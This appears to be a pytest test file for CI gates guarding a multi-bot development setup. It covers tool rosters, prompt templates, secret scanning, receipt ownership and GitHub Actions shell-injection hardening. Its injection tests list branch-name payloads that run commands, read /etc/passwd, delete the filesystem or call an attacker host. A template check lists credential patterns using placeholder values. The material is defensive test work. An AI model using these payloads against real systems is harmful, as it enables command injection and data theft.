        placeholders separately, and that migration is not what this test measures."""
        for name in ("prompts", "assembled", "templates"):
            (tmp_path / name).mkdir()
        r = run_gate(
            "check_desk_integrity.py", "--repo", str(REPO_ROOT),
            "--rosters-dir", str(self.ROSTERS), "--packs-dir", str(self.PACKS),
            "--prompts-dir", str(tmp_path / "prompts"),
            "--assembled-dir", str(tmp_path / "assembled"),
            "--templates-dir", str(tmp_path / "templates"),
        )
        assert r.returncode == 0, r.stderr
        assert "G-7 PASS" in r.stdout
        assert "7 rosters, 3 packs" in r.stdout

    def test_fixture_copy_passes(self, tmp_path):
        """The unaltered fixture passes, so every failure below is caused by its one edit."""
        dirs = self._desk(tmp_path)
        r = self._run(tmp_path, dirs)
        assert r.returncode == 0, r.stderr

    # --- rosters ------------------------------------------------------------

    def test_roster_with_nine_tools_blocked(self, tmp_path):
        """Core 8 + 1 own = 9: below the floor."""
        dirs = self._desk(tmp_path)
        self._edit_yaml(dirs["rosters"] / "android.yaml",
                        lambda d: d.update(tools=d["tools"][:1]))
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "android.yaml" in r.stderr
        assert "9 effective tool(s)" in r.stderr

    def test_roster_with_sixteen_tools_blocked(self, tmp_path):
        """Core 8 + 8 own = 16: past the ceiling."""
        dirs = self._desk(tmp_path)
        self._edit_yaml(
            dirs["rosters"] / "android.yaml",
            lambda d: d["tools"].append(self._clone_tool(d["tools"], 0, "desk_play_extra")),
        )
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "16 effective tool(s)" in r.stderr

    def test_g5_tool_without_rollback_plan_blocked(self, tmp_path):
        """A g5 tool whose schema does not require rollback_plan is a deployment G-5 never sees."""
        dirs = self._desk(tmp_path)

        def strip(doc):
            tool = next(t for t in doc["tools"] if t["name"] == "desk_play_staged_rollout")
            assert "g5" in tool["gates"]
            tool["input"]["required"].remove("rollback_plan")

        self._edit_yaml(dirs["rosters"] / "android.yaml", strip)
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "desk_play_staged_rollout" in r.stderr
        assert "rollback_plan" in r.stderr

    def test_g6_tool_without_approval_id_blocked(self, tmp_path):
        dirs = self._desk(tmp_path)

        def strip(doc):
            tool = next(t for t in doc["tools"] if t["name"] == "desk_play_halt_rollout")
            tool["input"]["required"].remove("approval_id")

        self._edit_yaml(dirs["rosters"] / "android.yaml", strip)
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "approval_id" in r.stderr

    def test_tool_without_input_schema_blocked(self, tmp_path):
        dirs = self._desk(tmp_path)
        self._edit_yaml(dirs["rosters"] / "web.yaml", lambda d: d["tools"][0].pop("input"))
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "no input schema" in r.stderr

    def test_duplicate_tool_name_across_core_and_seat_blocked(self, tmp_path):
        """A seat tool named like a core tool would shadow it on the endpoint."""
        dirs = self._desk(tmp_path)
        self._edit_yaml(dirs["rosters"] / "ios.yaml",
                        lambda d: d["tools"][0].update(name="desk_brief"))
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "declared twice" in r.stderr

    def test_endpoint_must_match_short_name(self, tmp_path):
        dirs = self._desk(tmp_path)
        self._edit_yaml(dirs["rosters"] / "infra.yaml", lambda d: d.update(endpoint="/mcp/ops"))
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "/mcp/infra" in r.stderr

    # --- packs --------------------------------------------------------------

    def test_pack_with_six_tools_blocked(self, tmp_path):
        dirs = self._desk(tmp_path)
        self._edit_yaml(
            dirs["packs"] / "kanbanos.yaml",
            lambda d: d["tools"].append(self._clone_tool(d["tools"], 0, "kanbanos_extra")),
        )
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "kanbanos.yaml" in r.stderr
        assert "6 tool(s)" in r.stderr

    def test_pack_tool_without_app_prefix_blocked(self, tmp_path):
        dirs = self._desk(tmp_path)
        self._edit_yaml(dirs["packs"] / "clippyos.yaml",
                        lambda d: d["tools"][0].update(name="desk_api_smoke"))
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "not prefixed 'clippyos_'" in r.stderr

    # --- prompts ------------------------------------------------------------

    UUID = "4d78b294-1c2e-4f5a-9b8c-0d1e2f3a4b5c"

    def test_prompt_source_with_literal_uuid_blocked(self, tmp_path):
        """A hardcoded channel id is a desk that cannot be installed for a second team."""
        dirs = self._desk(tmp_path)
        (dirs["prompts"] / "bot-03-android.xml").write_text(
            f"<prompt><channel_id>{self.UUID}</channel_id></prompt>\n"
        )
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "bot-03-android.xml" in r.stderr
        assert "literal UUID" in r.stderr

    def test_prompt_source_with_placeholder_passes(self, tmp_path):
        dirs = self._desk(tmp_path)
        (dirs["prompts"] / "_shared").mkdir()
        (dirs["prompts"] / "_shared" / "core-directives.xml").write_text(
            "<prompt><channel_id>{{DESK_CHANNEL_ID}}</channel_id>"
            "<agent_uuid>{{SEAT_UUID:ANDROID}}</agent_uuid></prompt>\n"
        )
        r = self._run(tmp_path, dirs)
        assert r.returncode == 0, r.stderr
        assert "1 prompt files checked" in r.stdout

    def test_assembled_prompt_with_unfilled_placeholder_blocked(self, tmp_path):
        dirs = self._desk(tmp_path)
        (dirs["assembled"] / "ANDROID.xml").write_text(
            "<prompt><agent_uuid>{{SEAT_UUID:ANDROID}}</agent_uuid></prompt>\n"
        )
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "ANDROID.xml" in r.stderr
        assert "unfilled placeholder {{SEAT_UUID:ANDROID}}" in r.stderr

    def test_assembled_alias_under_prompts_is_checked_as_output(self, tmp_path):
        """prompts/ANDROID.xml is assembled output: a UUID is fine there, a placeholder is not."""
        dirs = self._desk(tmp_path)
        (dirs["prompts"] / "ANDROID.xml").write_text(
            f"<prompt><agent_uuid>{self.UUID}</agent_uuid></prompt>\n"
        )
        r = self._run(tmp_path, dirs)
        assert r.returncode == 0, r.stderr

        (dirs["prompts"] / "ANDROID.xml").write_text("<prompt>{{DESK_CHANNEL_ID}}</prompt>\n")
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "unfilled placeholder" in r.stderr

    def test_empty_assembled_prompt_blocked(self, tmp_path):
        dirs = self._desk(tmp_path)
        (dirs["assembled"] / "LEAD.xml").write_text("")
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert "empty" in r.stderr

    # --- templates ----------------------------------------------------------

    @pytest.mark.parametrize("content,label", [
        ("token: ghp_0123456789abcdefghij",                     "GitHub token shape"),  # pragma: allowlist secret — gate fixture
        ("gateway: http://desk-gateway.railway.internal:8080", "railway.internal"),
        ("key: sk-abcdefghijklmnopqrstuvwxyz",                  "API key shape"),  # pragma: allowlist secret — gate fixture
        ("slack: xoxb-000",                                     "Slack token shape"),
        ("aws: AKIAIOSFODNN7EXAMPLE",                           "AWS access key shape"),  # pragma: allowlist secret — gate fixture
        ("-----BEGIN OPENSSH PRIVATE KEY-----",                 "key block"),  # pragma: allowlist secret — gate fixture
        ("host: tailscale-forwarder",                           "tailnet name"),
        ("url: https://vps.tail1234.ts.net/mcp/lead",           "tailnet domain"),
        ("ip: 100.101.102.103",                                 "tailnet address"),
        ("agent: 4d78b294-1c2e-4f5a-9b8c-0d1e2f3a4b5c",         "literal UUID"),
    ])
    def test_template_with_forbidden_content_blocked(self, tmp_path, content, label):
        """Templates are published to every recipient team: nothing in them may point at the
        desk's own infrastructure or credentials."""
        dirs = self._desk(tmp_path)
        (dirs["templates"] / "android.md").write_text(f"# ANDROID\n\n{content}\n")
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1, f"{label} should have been caught"
        assert "android.md" in r.stderr

    def test_template_gate_does_not_leak_the_token(self, tmp_path):
        token = "ghp_0123456789abcdefghij"  # pragma: allowlist secret — gate fixture
        dirs = self._desk(tmp_path)
        (dirs["templates"] / "lead.md").write_text(f"token: {token}\n")
        r = self._run(tmp_path, dirs)
        assert r.returncode == 1
        assert token not in r.stderr, "the gate leaked the token into its own output"

    def test_clean_template_passes(self, tmp_path):
        dirs = self._desk(tmp_path)
        (dirs["templates"] / "lead.md").write_text(
            "# LEAD\n\nProgramming lead for the desk. Connect to {{DESK_GATEWAY_URL}}/mcp/lead.\n"
        )
        r = self._run(tmp_path, dirs)
        assert r.returncode == 0, r.stderr

    def test_missing_templates_dir_is_skipped_not_failed(self, tmp_path):
        """The templates are generated later in the rollout; their absence is not a defect."""
        dirs = self._desk(tmp_path)
        dirs["templates"].rmdir()
        r = self._run(tmp_path, dirs)
        assert r.returncode == 0, r.stderr
        assert "template check skipped" in r.stdout


# ===========================================================================
# Receipt directory ownership
#
# Found by end-to-end testing: every bot writes receipts, so a single shared
# .receipts/ was an unowned, permanently contended path. Per-bot subdirectories
# keep one owner per path and stop a bot editing another's evidence.
# ===========================================================================

class TestReceiptDirectoryOwnership:

    @pytest.mark.parametrize("bot", [
        "bot-00-programming-lead",
        "bot-01-systems-backend", "bot-02-web-edge", "bot-03-android",
        "bot-04-ios", "bot-05-infrastructure", "bot-06-quality-security",
    ])
    def test_each_bot_owns_its_receipt_directory(self, bot):
        r = run_gate("check_ownership.py", "--bot", bot,
                     "--files", f".receipts/{bot}/task.json")
        assert r.returncode == 0, r.stderr

    def test_bot_cannot_write_another_bots_receipts(self):
        r = run_gate("check_ownership.py", "--bot", "bot-03-android",
                     "--files", ".receipts/bot-01-systems-backend/task.json")
        assert r.returncode == 1
        assert "FOREIGN" in r.stderr

    def test_bare_receipts_directory_is_unowned(self):
        """A receipt at the root of .receipts/ has no single owner and must fail."""
        r = run_gate("check_ownership.py", "--bot", "bot-01-systems-backend",
                     "--files", ".receipts/task.json")
        assert r.returncode == 1
        assert "UNOWNED" in r.stderr

    def test_lead_owns_orchestrator_paths(self):
        """LEAD owns the operating model, its prompt, and its receipts — not the desk's code."""
        r = run_gate(
            "check_ownership.py", "--bot", "bot-00-programming-lead",
            "--files",
            "docs/desk-operating-model.md",
            "prompts/bot-00-programming-lead.xml",
            ".receipts/bot-00-programming-lead/task.json",
        )
        assert r.returncode == 0, r.stderr

    def test_quality_does_not_own_the_operating_model(self):
        """docs/** is QUALITY, except the operating model, where last-match gives it to LEAD."""
        r = run_gate(
            "check_ownership.py", "--bot", "bot-06-quality-security",
            "--files", "docs/desk-operating-model.md",
        )
        assert r.returncode == 1
        assert "FOREIGN" in r.stderr
        assert "bot-00-programming-lead" in r.stderr

    def test_lead_cannot_edit_specialist_paths(self):
        r = run_gate(
            "check_ownership.py", "--bot", "bot-00-programming-lead",
            "--files", "services/api/main.py",
        )
        assert r.returncode == 1
        assert "FOREIGN" in r.stderr
        assert "bot-01-systems-backend" in r.stderr


# ===========================================================================
# The gate workflows themselves — shell injection
# ===========================================================================

WORKFLOWS = [
    ".github/workflows/gates.yml",      # the copy that runs here
    "ci/.github/workflows/gates.yml",   # the copy other repositories take
]


class TestEveryGateIsWired:
    """A gate no step runs is not a gate.

    The template-sync check cannot catch a gate being dropped, because it compares the two
    workflow copies to each other: delete a step from both and it stays green. That is not
    hypothetical — a commit whose subject was only about switching to a self-hosted runner
    removed the G-7 step from both files, and sync passed.

    Keyed on the *invocation* rather than the step name, so renaming or reordering a step is
    free while removing the check it performs is not. One script can carry more than one
    gate — check_ownership.py runs the manifest self-check and the path-ownership check as
    separate steps — so a per-filename test would stay green after either was deleted, the
    other's mention being enough to satisfy it.
    """

    # (label, script, a flag that distinguishes this invocation from others of the same script)
    REQUIRED = [
        ("G-1 manifest self-check", "check_ownership.py", "--validate-manifest"),
        ("G-1 path ownership", "check_ownership.py", "--bot"),
        ("G-2 verification receipt", "check_receipt.py", None),
        ("G-3 committed secrets", "check_secrets.py", None),
        ("G-4 contract-first changes", "check_contracts.py", None),
        ("G-5/G-6 rollback and destructive ops", "check_rollback.py", None),
        ("G-7 desk integrity", "check_desk_integrity.py", None),
    ]

    @staticmethod
    def _run_bodies(workflow: str) -> list[str]:
        yaml = pytest.importorskip("yaml")
        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
        return [
            step["run"]
            for job in doc["jobs"].values()
            for step in (job.get("steps") or [])
            if step.get("run")
        ]

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_every_required_gate_check_has_a_step(self, workflow):
        bodies = self._run_bodies(workflow)
        missing = [
            label for label, script, flag in self.REQUIRED
            if not any(script in b and (flag is None or flag in b) for b in bodies)
        ]
        assert not missing, (
            f"{workflow} has no step running: {'; '.join(missing)}. "
            "Each is a required check — one the workflow never runs blocks nothing, and "
            "template sync will not notice, because it only compares the two copies to each "
            "other. Restore the step, or drop the gate deliberately and update this list."
        )

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_no_gate_script_is_left_unwired(self, workflow):
        """Catches a *new* gate script that was added without being wired into the workflow."""
        scripts = {p.name for p in GATES.glob("check_*.py")}
        assert scripts, "no gate scripts found — this test is not looking where it thinks"

        bodies = self._run_bodies(workflow)
        unwired = sorted(s for s in scripts if not any(s in b for b in bodies))
        assert not unwired, (
            f"{workflow} never runs: {', '.join(unwired)}. A gate script in ci/gates/ that no "
            "step invokes enforces nothing. Wire it up, add it to REQUIRED above, or delete it."
        )


class TestReceiptSelection:
    """G-2 must read the receipt for THIS change, not one replayed alongside it.

    A rebase or a stack landing adds several of a seat's receipts at once, all of them
    "added" relative to the base. Selecting by sort order then validates the change against
    a receipt describing different work — failing closed when that receipt has no
    approved_by, and passing on it when it has one. That second case is the same fail-open
    G-4's change-document selector was fixed for; this is the sibling selector.

    Runs the shipped step rather than a copy of it, for the reason the injection tests do.
    """

    @staticmethod
    def _select(workflow: str, tmp_path: Path, receipts: dict[str, dict | None],
                head_ref: str) -> subprocess.CompletedProcess:
        """Run the shipped selection step against a fixture set of receipts.

        `receipts` maps filename to its JSON content, or None to write invalid JSON. The
        step's `git diff` is stubbed by pre-writing receipts.txt, which is what it consumes.
        """
        yaml = pytest.importorskip("yaml")
        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
        body = next(
            s["run"] for job in doc["jobs"].values() for s in (job.get("steps") or [])
            if s.get("id") == "receipt" and s.get("run")
        )
        # Drop the `git diff ... > receipts.txt` line: the fixture supplies that file.
        kept = [ln for ln in body.splitlines(keepends=True)
                if "git diff" not in ln and not ln.strip().startswith(('"origin/$BASE_REF', "| grep -E"))]

        bot_dir = tmp_path / ".receipts" / "bot-00-programming-lead"
        bot_dir.mkdir(parents=True)
        listing = []
        for name, content in receipts.items():
            f = bot_dir / name
            f.write_text("not json" if content is None else json.dumps(content))
            listing.append(str(f.relative_to(tmp_path)))
        (tmp_path / "receipts.txt").write_text("\n".join(listing) + "\n")

        script = tmp_path / "select.sh"
        script.write_text("".join(kept))
        return subprocess.run(
            ["bash", "-e", str(script)],
            capture_output=True, text=True, cwd=tmp_path,
            env={"BOT": "bot-00-programming-lead", "BASE_REF": "main",
                 "HEAD_REF": head_ref, "GITHUB_OUTPUT": str(tmp_path / "out"),
                 "PATH": os.environ["PATH"]},
        )

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_single_receipt_is_used_as_is(self, workflow, tmp_path):
        """The common case must keep working, including when it names no branch."""
        r = self._select(workflow, tmp_path, {"only.json": {"task_id": "x"}}, "any/branch")
        assert r.returncode == 0, r.stdout + r.stderr
        assert "only.json" in (tmp_path / "out").read_text()

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_replayed_receipt_does_not_win_on_sort_order(self, workflow, tmp_path):
        """The real case: 'grokbot' sorts before 'stack', and only the latter is this change."""
        r = self._select(workflow, tmp_path, {
            "desk-v2-grokbot-share.json": {"task_id": "replayed"},
            "desk-v2-stack-land-on-main.json": {"task_id": "this", "branch": "bot-00/land"},
        }, "bot-00/land")
        assert r.returncode == 0, r.stdout + r.stderr
        selected = (tmp_path / "out").read_text()
        assert "desk-v2-stack-land-on-main.json" in selected
        assert "grokbot" not in selected

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_ambiguous_receipts_stop_the_build(self, workflow, tmp_path):
        """Two receipts and none naming this branch is not a guess the gate may make."""
        r = self._select(workflow, tmp_path, {
            "a.json": {"task_id": "a"}, "b.json": {"task_id": "b"},
        }, "bot-00/land")
        assert r.returncode != 0
        assert "2 receipts" in r.stdout + r.stderr

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_no_receipt_still_fails(self, workflow, tmp_path):
        r = self._select(workflow, tmp_path, {}, "bot-00/land")
        assert r.returncode != 0
        assert "no verification receipt" in r.stdout + r.stderr

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_unreadable_receipt_does_not_crash_the_selection(self, workflow, tmp_path):
        """A malformed receipt must not take the gate down; it just cannot be the match."""
        r = self._select(workflow, tmp_path, {
            "broken.json": None,
            "good.json": {"task_id": "this", "branch": "bot-00/land"},
        }, "bot-00/land")
        assert r.returncode == 0, r.stdout + r.stderr
        assert "good.json" in (tmp_path / "out").read_text()


class TestWorkflowShellInjection:
    """A gate that runs attacker-controlled text as shell is worse than no gate.

    Branch names are attacker-controlled on a fork pull request, so anything derived from
    one — and the receipt path derived from that in turn — reaches these workflows as
    untrusted input. The rule both files follow: untrusted values enter a step through
    `env:` and are read as quoted shell variables. A `${{ }}` expansion inside a `run:`
    body is different in kind, because Actions substitutes it into the script *before*
    bash parses it, so the value becomes source code rather than data.

    These tests exist because that protection was silently reverted once: a branch
    carried an older copy of the workflow forward over the hardened one, and nothing
    caught it — the two files still agreed with each other, so the template-sync check
    passed. Reviewing a workflow diff for this by eye does not scale.
    """

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_no_github_expression_inside_a_run_body(self, workflow):
        """The P1 condition itself, asserted structurally rather than by grepping text."""
        yaml = pytest.importorskip("yaml")
        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())

        offenders = []
        for job_name, job in doc["jobs"].items():
            for i, step in enumerate(job.get("steps") or []):
                body = step.get("run")
                if body and "${{" in body:
                    name = step.get("name", f"steps[{i}]")
                    offenders.append(f"{job_name} / {name}")

        assert not offenders, (
            f"{workflow} interpolates a GitHub expression into a shell body: "
            + "; ".join(offenders)
            + ". Pass the value through an env: block and read it as \"$VAR\" instead — "
            "Actions substitutes ${{ }} before bash parses the script, so the value "
            "becomes code."
        )

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    def test_acting_bot_pattern_is_anchored_at_both_ends(self, workflow):
        """Secondary to the behavioural tests below, which run the shipped step itself.

        Kept because it names the cause directly: when the behavioural tests go red this
        says whether the pattern was the thing that changed.
        """
        text = (REPO_ROOT / workflow).read_text()
        assert "^bot-0[0-6]-[a-z0-9-]+$" in text, (
            f"{workflow} does not validate the acting bot against an anchored pattern. "
            "A prefix-only match such as ^bot-0[0-6]- accepts a branch named "
            "bot-01-$(id)/x, and the bot id is then used to build paths in later steps."
        )

    INJECTION_BRANCHES = [
        "bot-01-$(id)/x",
        "bot-01-`whoami`/x",
        "bot-01-a;cat /etc/passwd/x",
        "bot-01-a$(curl attacker.test)/x",
        'bot-01-a"; rm -rf /; #/x',
        "bot-07-nope/x",          # no such seat
        "claude/desk-v2-stack/x",  # no bot prefix at all
    ]

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    @pytest.mark.parametrize("branch", INJECTION_BRANCHES)
    def test_injection_payload_in_a_branch_name_is_rejected(self, workflow, branch, tmp_path):
        """Runs the shipped step, not a copy of it, and requires a refusal."""
        code, bot = self._resolve_acting_bot(workflow, branch, tmp_path)
        assert code != 0, f"branch {branch!r} was accepted; resolved to {bot!r}"
        assert bot is None, f"branch {branch!r} still produced an output bot: {bot!r}"

    @pytest.mark.parametrize("workflow", WORKFLOWS)
    @pytest.mark.parametrize("branch,expected", [
        ("bot-00-programming-lead/desk-model", "bot-00-programming-lead"),
        ("bot-03-android/feat-push-notifications", "bot-03-android"),
        ("bot-06-quality-security/desk-v2-assembled-prompts", "bot-06-quality-security"),
    ])
    def test_legitimate_branch_still_resolves(self, workflow, branch, expected, tmp_path):
        """The refusals above are worthless if the step also rejects real branches."""
        code, bot = self._resolve_acting_bot(workflow, branch, tmp_path)
        assert code == 0, f"{branch!r} was refused by {workflow}"
        assert bot == expected

    @staticmethod
    def _acting_bot_script(workflow: str) -> str:
        """The `run:` body of the shipped 'Determine the acting bot' step.

        Extracted rather than transcribed: a copy of the logic here would keep passing
        while the workflow's own parsing or validation changed underneath it, which is the
        one thing these tests exist to prevent.
        """
        yaml = pytest.importorskip("yaml")
        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
        for job in doc["jobs"].values():
            for step in job.get("steps") or []:
                if step.get("id") == "bot" and step.get("run"):
                    return step["run"]
        raise AssertionError(
            f"{workflow} has no step with id 'bot' that runs a script — the acting-bot "
            "resolution these tests cover has moved or been renamed, so they are no "
            "longer testing it."
        )

    @classmethod
    def _resolve_acting_bot(cls, workflow: str, branch: str,
                            tmp_path: Path) -> tuple[int, str | None]:
        """Run the shipped step against one branch. Returns (exit code, resolved bot).

        Mirrors how Actions invokes it: `bash -e <file>` — the default shell on Linux
        runners — with the branch in the environment and a real $GITHUB_OUTPUT to append
        to. The bot is read back from that file rather than from stdout, because the step
        publishes it there for later steps to consume.
        """
        script = tmp_path / "acting-bot.sh"
        script.write_text(cls._acting_bot_script(workflow))
        output = tmp_path / "github_output"
        output.touch()

        r = subprocess.run(
            ["bash", "-e", str(script)],
            capture_output=True, text=True,
            env={
                "GITHUB_HEAD_REF": branch,
                "GITHUB_REF": "",
                "GITHUB_OUTPUT": str(output),
                "PATH": "/usr/bin:/bin",
            },
        )
        bot = None
        for line in output.read_text().splitlines():
            if line.startswith("bot="):
                bot = line[len("bot="):]
        return r.returncode, bot
